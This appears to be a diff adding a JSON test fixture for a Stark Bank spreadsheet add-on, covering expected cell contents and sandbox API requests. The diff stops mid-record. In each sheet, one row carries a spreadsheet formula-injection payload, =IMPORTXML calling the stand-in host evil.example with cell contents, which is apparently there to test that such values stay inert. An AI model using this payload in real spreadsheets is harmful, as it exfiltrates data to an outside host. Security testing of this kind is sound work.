@@ -1,0 +1,3519 @@
+{
+ "statement": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Extrato": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data",
+    "10,2|t|Tipo de transação",
+    "10,3|t|Valor",
+    "10,4|t|Saldo Final",
+    "10,5|t|Descrição",
+    "10,6|t|Id Transação",
+    "10,7|t|Tarifa",
+    "10,8|t|Tags",
+    "11,1|t|2024-03-05",
+    "11,2|t|Transf. sem aprovação",
+    "11,3|n|-100",
+    "11,4|n|2500",
+    "11,5|t|Transferência para José & Cia",
+    "11,6|n|9001",
+    "11,7|n|1",
+    "11,8|t|a,b",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|Recebimento de boleto pago",
+    "12,3|n|0.55",
+    "12,4|n|2499.45",
+    "12,5|t|Boleto 100% pago (ref. 12)",
+    "12,6|n|9002",
+    "12,7|n|0",
+    "13,1|t|2024-03-05",
+    "13,2|t|Outros",
+    "13,3|n|0.01",
+    "13,4|n|2499.46",
+    "13,5|t|-",
+    "13,6|n|9003",
+    "13,7|n|0",
+    "13,8|t|x,y",
+    "14,1|t|2024-03-05",
+    "14,2|t|Transf. sem aprovação",
+    "14,3|n|-100",
+    "14,4|n|2500",
+    "14,5|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,6|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,7|n|1",
+    "14,8|t|a,b"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/transaction",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/transaction",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "cursor": "2"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewStatement"
+   }
+  ]
+ },
+ "emptyStatement": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Extrato": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data",
+    "10,2|t|Tipo de transação",
+    "10,3|t|Valor",
+    "10,4|t|Saldo Final",
+    "10,5|t|Descrição",
+    "10,6|t|Id Transação",
+    "10,7|t|Tarifa",
+    "10,8|t|Tags",
+    "11,30|t|sentinela AD11"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/transaction",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [
+   "Nenhuma transação encontrada para o período selecionado!"
+  ],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewStatement"
+   }
+  ]
+ },
+ "transfers": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Transferência": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data de Criação",
+    "10,2|t|Id Transferência",
+    "10,3|t|Valor",
+    "10,4|t|Status",
+    "10,5|t|Nome",
+    "10,6|t|CPF/CNPJ",
+    "10,7|t|Código do Banco",
+    "10,8|t|Agência",
+    "10,9|t|Número da Conta",
+    "10,10|t|Ids de Transação (Saída, Estorno)",
+    "11,1|t|2024-03-05",
+    "11,2|n|5001",
+    "11,3|n|1234.56",
+    "11,4|t|sucesso",
+    "11,5|t|José da Silva & Filhos Ltda",
+    "11,6|t|012.345.678-90",
+    "11,7|n|341",
+    "11,8|n|1234",
+    "11,9|t|12345-6",
+    "11,10|t|t1,t2",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|n|5002",
+    "12,3|n|0.5",
+    "12,4|t|processando",
+    "12,5|t|Loja do Zé (matriz)",
+    "12,6|t|12.345.678/0001-90",
+    "12,7|n|20018183",
+    "12,8|n|1",
+    "12,9|t|9-9",
+    "13,1|t|2024-03-05",
+    "13,2|n|5003",
+    "13,3|n|10000",
+    "13,4|t|falha",
+    "13,5|t|+55 (11) 99999-9999",
+    "13,6|n|98765432100",
+    "13,7|n|1",
+    "13,8|n|4321",
+    "13,9|n|1",
+    "13,10|t|t9",
+    "14,1|t|2024-03-05",
+    "14,2|n|5001",
+    "14,3|n|1234.56",
+    "14,4|t|sucesso",
+    "14,5|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,6|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,7|n|341",
+    "14,8|n|1234",
+    "14,9|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,10|t|t1,t2"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/transfer",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "success"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/transfer",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "success",
+     "cursor": "2"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewTransfer"
+   }
+  ]
+ },
+ "boletos": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Boleto": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data de Emissão",
+    "10,2|t|Nome",
+    "10,3|t|CPF/CNPJ",
+    "10,4|t|Status",
+    "10,5|t|Valor",
+    "10,6|t|Vencimento",
+    "10,7|t|Linha digitável",
+    "10,8|t|Id Boleto",
+    "10,9|t|Tarifa",
+    "10,10|t|Tags",
+    "10,11|t|Link PDF",
+    "11,1|t|2024-03-05",
+    "11,2|t|Maria O'Brien",
+    "11,3|t|012.345.678-90",
+    "11,4|t|registrado",
+    "11,5|n|150",
+    "11,6|t|2024-04-09",
+    "11,7|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,8|n|6001",
+    "11,9|n|2",
+    "11,10|t|loja,sp",
+    "11,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|Empresa 100% Brasil",
+    "12,3|t|12.345.678/0001-90",
+    "12,4|t|pago",
+    "12,5|n|0.99",
+    "12,6|t|2024-04-10",
+    "12,8|n|6002",
+    "12,9|n|0",
+    "12,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
+    "13,1|t|2024-03-05",
+    "13,2|t|@handle e 'aspas' \"duplas\"",
+    "13,3|n|98765432100",
+    "13,4|t|vencido",
+    "13,5|n|25",
+    "13,6|t|2023-12-31",
+    "13,7|n|0",
+    "13,8|n|6003",
+    "13,9|n|0.01",
+    "13,10|t|a,b,c",
+    "13,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6003/pdf\", \"PDF\")",
+    "14,1|t|2024-03-05",
+    "14,2|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,3|t|012.345.678-90",
+    "14,4|t|registrado",
+    "14,5|n|150",
+    "14,6|t|2024-04-09",
+    "14,7|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,8|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,9|n|2",
+    "14,10|t|loja,sp",
+    "14,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/=IMPORTXML(\"\"https://evil.example/?x=\"\"&A1,\"\"//a\"\")/pdf\", \"PDF\")"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/boleto",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "registered"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "registered",
+     "cursor": "2"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewCharge"
+   }
+  ]
+ },
+ "boletoPayments": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Pagamento Boleto": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data de Criação",
+    "10,2|t|Id Pagamento",
+    "10,3|t|Valor",
+    "10,4|t|Status",
+    "10,5|t|Data de Agendamento",
+    "10,6|t|Linha Digitável",
+    "10,7|t|Descrição",
+    "10,8|t|Tags",
+    "11,1|t|2024-03-05",
+    "11,2|n|4001",
+    "11,3|n|150",
+    "11,4|t|sucesso",
+    "11,5|t|2024-04-09",
+    "11,6|t|34191.09008 61207.727808",
+    "11,7|t|Pagamento de boleto A",
+    "11,8|t|loja",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|n|4002",
+    "12,3|n|0.99",
+    "12,4|t|processando",
+    "12,5|t|2024-04-10",
+    "12,6|n|190.00009",
+    "12,7|t|O'Brien & Filhos",
+    "13,1|t|2024-03-05",
+    "13,2|n|4001",
+    "13,3|n|150",
+    "13,4|t|sucesso",
+    "13,5|t|2024-04-09",
+    "13,6|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,7|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,8|t|loja"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/boleto-payment",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "success"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto-payment",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "success",
+     "cursor": "2"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewChargePayment"
+   }
+  ]
+ },
+ "invoices": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Invoices Emitidas": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data de Emissão",
+    "10,2|t|Nome",
+    "10,3|t|CPF/CNPJ",
+    "10,4|t|Status",
+    "10,5|t|Valor",
+    "10,6|t|Valor de Emissão",
+    "10,7|t|Desconto",
+    "10,8|t|Multa",
+    "10,9|t|Juros",
+    "10,10|t|Vencimento",
+    "10,11|t|Pagavel até",
+    "10,12|t|Copia e Cola (BR Code)",
+    "10,13|t|id da Invoice",
+    "10,14|t|Tarifa",
+    "10,15|t|Tags",
+    "10,16|t|Link PDF",
+    "11,1|t|2024-03-05",
+    "11,2|t|Ana Souza",
+    "11,3|t|012.345.678-90",
+    "11,4|t|pago",
+    "11,5|n|10",
+    "11,6|n|10",
+    "11,7|n|1",
+    "11,8|n|0",
+    "11,9|n|0",
+    "11,10|t|2024-04-09",
+    "11,11|n|3600",
+    "11,12|t|00020126580014br.gov.bcb.pix",
+    "11,13|n|7001",
+    "11,14|n|0.05",
+    "11,15|t|x",
+    "11,16|f|=HYPERLINK(\"https://example.com/invoice/7001.pdf\", \"PDF\")",
+    "11,17|t|SIM",
+    "11,18|n|3",
+    "11,19|n|2",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|Carlos",
+    "12,3|n|98765432100",
+    "12,4|t|criado",
+    "12,5|n|5",
+    "12,6|n|5",
+    "12,8|n|0.1",
+    "12,9|n|0.05",
+    "12,10|t|2024-04-30",
+    "12,11|n|86400",
+    "12,13|n|7002",
+    "12,14|n|0",
+    "12,16|f|=HYPERLINK(\"https://example.com/invoice/7002.pdf\", \"PDF\")",
+    "12,17|t|NÃO",
+    "13,1|t|2024-03-05",
+    "13,2|t|Ana Souza",
+    "13,3|t|012.345.678-90",
+    "13,4|t|pago",
+    "13,5|n|10",
+    "13,6|n|10",
+    "13,7|n|1",
+    "13,8|n|0",
+    "13,9|n|0",
+    "13,10|t|2024-04-09",
+    "13,11|n|3600",
+    "13,12|t|00020126580014br.gov.bcb.pix",
+    "13,13|n|7003",
+    "13,14|n|0.05",
+    "13,15|t|x",
+    "13,16|f|=HYPERLINK(\"https://example.com/invoice/7001.pdf\", \"PDF\")",
+    "13,17|t|SIM",
+    "13,18|n|0.01",
+    "13,19|n|0.02",
+    "13,20|n|0.03",
+    "14,1|t|2024-03-05",
+    "14,2|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,3|t|012.345.678-90",
+    "14,4|t|pago",
+    "14,5|n|10",
+    "14,6|n|10",
+    "14,7|n|1",
+    "14,8|n|0",
+    "14,9|n|0",
+    "14,10|t|2024-04-09",
+    "14,11|n|3600",
+    "14,12|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,13|n|7001",
+    "14,14|n|0.05",
+    "14,15|t|x",
+    "14,16|f|=HYPERLINK(\"=IMPORTXML(\"\"https://evil.example/?x=\"\"&A1,\"\"//a\"\")\", \"PDF\")",
+    "14,17|t|SIM",
+    "14,18|n|3",
+    "14,19|n|2"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/invoice",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "paid"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/invoice",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "paid",
+     "cursor": "2"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewInvoice"
+   }
+  ]
+ },
+ "paymentRequests": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Aprovações": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data da Solicitação",
+    "10,2|t|Tipo de Pagamento",
+    "10,3|t|Descrição",
+    "10,4|t|Valor",
+    "10,5|t|Solicitado por",
+    "10,6|t|Status",
+    "10,7|t|ID do pagamento",
+    "10,8|t|Tags",
+    "10,9|t|Nome",
+    "10,10|t|CPF/CNPJ",
+    "10,11|t|Codigo do Banco/ISPB",
+    "10,12|t|Agencia",
+    "10,13|t|Conta",
+    "11,1|t|2024-03-05",
+    "11,2|t|transfer",
+    "11,3|t|Fornecedor A",
+    "11,4|n|1234",
+    "11,5|t|Maria Aprovadora",
+    "11,6|t|pending",
+    "11,7|n|2001",
+    "11,8|t|x",
+    "11,9|t|José & Cia",
+    "11,10|t|012.345.678-90",
+    "11,11|n|341",
+    "11,12|n|1234",
+    "11,13|t|1-9",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|boleto-payment",
+    "12,3|t|Boleto luz",
+    "12,4|n|50",
+    "12,5|t|João",
+    "12,6|t|approved",
+    "12,7|n|2002",
+    "12,9|t|34191.09008 61207.727808",
+    "12,10|t|12.345.678/0001-90",
+    "13,1|t|2024-03-05",
+    "13,2|t|boleto-payment",
+    "13,3|t|Boleto água",
+    "13,4|n|70",
+    "13,5|t|Ana",
+    "13,6|t|approved",
+    "13,7|n|2003",
+    "13,8|t|a,b",
+    "13,9|n|3.4191090086120774e+46",
+    "13,10|n|98765432100",
+    "14,1|t|2024-03-05",
+    "14,2|t|darf-payment",
+    "14,3|t|Imposto",
+    "14,4|n|90",
+    "14,5|t|Pedro",
+    "14,6|t|pending",
+    "14,7|n|2004",
+    "14,9|n|85800000000",
+    "14,10|t|12.345.678/0001-90",
+    "15,1|t|2024-03-04",
+    "15,2|t|utility-payment",
+    "15,3|t|Conta de gás",
+    "15,4|n|1",
+    "15,5|t|Lia",
+    "15,6|t|denied",
+    "15,7|n|2005",
+    "15,8|t|z",
+    "15,9|n|83660000001",
+    "16,1|t|2024-03-05",
+    "16,2|t|brcode-payment",
+    "16,3|t|Pix copia e cola",
+    "16,4|n|2.5",
+    "16,5|t|Rui",
+    "16,6|t|pending",
+    "16,7|n|2006",
+    "17,1|t|2024-03-05",
+    "17,2|t|transfer",
+    "17,3|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "17,4|n|1234",
+    "17,5|t|Maria Aprovadora",
+    "17,6|t|pending",
+    "17,7|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "17,8|t|x",
+    "17,9|t|José & Cia",
+    "17,10|t|012.345.678-90",
+    "17,11|n|341",
+    "17,12|n|1234",
+    "17,13|t|1-9"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/payment-request",
+    "query": {
+     "centerId": "center-1",
+     "type": "transfer",
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "pending"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/payment-request",
+    "query": {
+     "centerId": "center-1",
+     "type": "transfer",
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "pending",
+     "cursor": "2"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/payment-request",
+    "query": {
+     "centerId": "center-1",
+     "type": "transfer",
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "pending",
+     "cursor": "4"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/payment-request",
+    "query": {
+     "centerId": "center-1",
+     "type": "transfer",
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "pending",
+     "cursor": "6"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewPaymentRequest"
+   }
+  ]
+ },
+ "paymentRequestsWithoutApprover": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Aprovações": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data da Solicitação",
+    "10,2|t|Tipo de Pagamento",
+    "10,3|t|Descrição",
+    "10,4|t|Valor",
+    "10,5|t|Solicitado por",
+    "10,6|t|Status",
+    "10,7|t|ID do pagamento",
+    "10,8|t|Tags",
+    "10,9|t|Nome",
+    "10,10|t|CPF/CNPJ",
+    "10,11|t|Codigo do Banco/ISPB",
+    "10,12|t|Agencia",
+    "10,13|t|Conta",
+    "11,1|t|2024-03-05",
+    "11,2|t|transfer",
+    "11,3|t|Fornecedor A",
+    "11,4|n|1234",
+    "11,5|t|Maria Aprovadora",
+    "11,6|t|pending",
+    "11,7|n|2001",
+    "11,8|t|x",
+    "11,9|t|José & Cia",
+    "11,10|t|012.345.678-90",
+    "11,11|n|341",
+    "11,12|n|1234",
+    "11,13|t|1-9",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-05",
+    "12,2|t|transfer",
+    "12,3|t|Fornecedor A",
+    "12,4|n|1234"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/payment-request",
+    "query": {
+     "centerId": "center-1",
+     "type": "transfer",
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewPaymentRequest",
+    "error": "Cannot read properties of undefined (reading 'name')"
+   }
+  ]
+ },
+ "paymentRequestsEndingInBoleto": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Aprovações": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data da Solicitação",
+    "10,2|t|Tipo de Pagamento",
+    "10,3|t|Descrição",
+    "10,4|t|Valor",
+    "10,5|t|Solicitado por",
+    "10,6|t|Status",
+    "10,7|t|ID do pagamento",
+    "10,8|t|Tags",
+    "10,9|t|Linha Digitavel / Código de Barras",
+    "10,10|t|CPF/CNPJ",
+    "11,1|t|2024-03-05",
+    "11,2|t|transfer",
+    "11,3|t|Fornecedor A",
+    "11,4|n|1234",
+    "11,5|t|Maria Aprovadora",
+    "11,6|t|pending",
+    "11,7|n|2001",
+    "11,8|t|x",
+    "11,9|t|José & Cia",
+    "11,10|t|012.345.678-90",
+    "11,11|n|341",
+    "11,12|n|1234",
+    "11,13|t|1-9",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|boleto-payment",
+    "12,3|t|Boleto luz",
+    "12,4|n|50",
+    "12,5|t|João",
+    "12,6|t|approved",
+    "12,7|n|2002",
+    "12,9|t|34191.09008 61207.727808",
+    "12,10|t|12.345.678/0001-90"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/payment-request",
+    "query": {
+     "centerId": "center-1",
+     "type": "boleto-payment",
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewPaymentRequest"
+   }
+  ]
+ },
+ "customers": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Clientes": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Id do Cliente",
+    "10,2|t|Nome",
+    "10,3|t|CPF/CNPJ",
+    "10,4|t|E-Mail",
+    "10,5|t|Telefone",
+    "10,6|t|Logradouro",
+    "10,7|t|Complemento",
+    "10,8|t|Bairro",
+    "10,9|t|Cidade",
+    "10,10|t|Estado",
+    "10,11|t|CEP",
+    "10,12|t|Tags",
+    "11,1|n|3001",
+    "11,2|t|Maria da Silva",
+    "11,3|t|012.345.678-90",
+    "11,4|t|maria@example.com",
+    "11,5|t|+5511999999999",
+    "11,6|t|Rua das Flores, 10",
+    "11,7|t|Apto 2",
+    "11,8|t|Centro",
+    "11,9|t|São Paulo",
+    "11,10|t|SP",
+    "11,11|t|01000-000",
+    "11,12|t|vip, sp",
+    "11,30|t|sentinela AD11",
+    "12,1|n|3002",
+    "12,2|t|Empresa & Cia",
+    "12,3|t|12.345.678/0001-90",
+    "12,4|t|contato@empresa.example",
+    "12,5|t|(11) 3333-4444",
+    "12,6|t|Av. Paulista, 1000",
+    "12,8|t|Bela Vista",
+    "12,9|t|São Paulo",
+    "12,10|t|SP",
+    "12,11|t|01310-100",
+    "13,1|n|3001",
+    "13,2|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,3|t|012.345.678-90",
+    "13,4|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,5|t|+5511999999999",
+    "13,6|t|Rua das Flores, 10",
+    "13,7|t|Apto 2",
+    "13,8|t|Centro",
+    "13,9|t|São Paulo",
+    "13,10|t|SP",
+    "13,11|t|01000-000",
+    "13,12|t|vip, sp"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/boleto/customer",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/customer",
+    "query": {
+     "cursor": "2"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "fetchCustomers"
+   }
+  ]
+ },
+ "boletoEvents": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Histórico de Boletos Emitidos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data do Evento",
+    "10,2|t|Evento",
+    "10,3|t|Nome",
+    "10,4|t|CPF/CPNJ",
+    "10,5|t|Valor",
+    "10,6|t|Valor de Emissão",
+    "10,7|t|Desconto",
+    "10,8|t|Multa",
+    "10,9|t|Juros",
+    "10,10|t|Data de Emissão",
+    "10,11|t|Vencimento",
+    "10,12|t|Linha Digitável",
+    "10,13|t|Id do Boleto",
+    "10,14|t|Tarifa",
+    "10,15|t|Tags",
+    "10,16|t|Link PDF",
+    "10,17|t|Logradouro",
+    "10,18|t|Complemento",
+    "10,19|t|Bairro",
+    "10,20|t|Cidade",
+    "10,21|t|Estado",
+    "10,22|t|CEP",
+    "11,1|t|2024-03-05",
+    "11,2|t|pago",
+    "11,3|t|Maria O'Brien",
+    "11,4|t|012.345.678-90",
+    "11,5|n|155",
+    "11,10|t|2024-03-05",
+    "11,11|t|2024-04-09",
+    "11,12|n|3.4191090086120774e+46",
+    "11,13|n|6001",
+    "11,14|n|2",
+    "11,15|t|loja,sp",
+    "11,16|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "11,17|t|Rua A, 1",
+    "11,18|t|Apto 2",
+    "11,19|t|Centro",
+    "11,20|t|São Paulo",
+    "11,21|t|SP",
+    "11,22|t|01000-000",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|pago",
+    "12,3|t|Maria O'Brien",
+    "12,4|t|012.345.678-90",
+    "12,5|n|156",
+    "12,6|n|150",
+    "12,8|n|3",
+    "12,9|n|3",
+    "12,10|t|2024-03-05",
+    "12,11|t|2024-04-09",
